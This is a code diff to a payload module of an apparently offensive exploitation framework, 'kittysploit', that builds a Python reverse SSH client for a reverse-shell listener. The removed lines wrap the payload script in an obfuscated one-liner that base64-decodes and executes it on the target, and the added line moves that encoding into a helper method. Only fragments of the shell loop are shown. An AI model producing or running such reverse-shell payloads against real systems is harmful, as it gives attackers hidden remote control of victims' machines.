@@ -3,12 +3,12 @@
 
 """Paramiko-based reverse SSH client for listeners/multi/reverse_ssh."""
 
-import base64
-
 from kittysploit import *
 
 
 class Module(Payload):
+    CLIENT_LANGUAGE = "python"
+
     __info__ = {
         "name": "Python Reverse SSH Client",
         "description": (
@@ -51,9 +51,4 @@ while not ch.closed:
         ch.send(line)
 c.close()
 '''
-        enc = base64.b64encode(script.encode()).decode("ascii")
-        py = str(self.python_binary or "python3")
-        return (
-            f"{py} -c \"import base64;exec(base64.b64decode('{enc}').decode())\" "
-            f"# requires paramiko on target"
-        )
+        return self._encode_python_one_liner(script.strip(), self.python_binary)
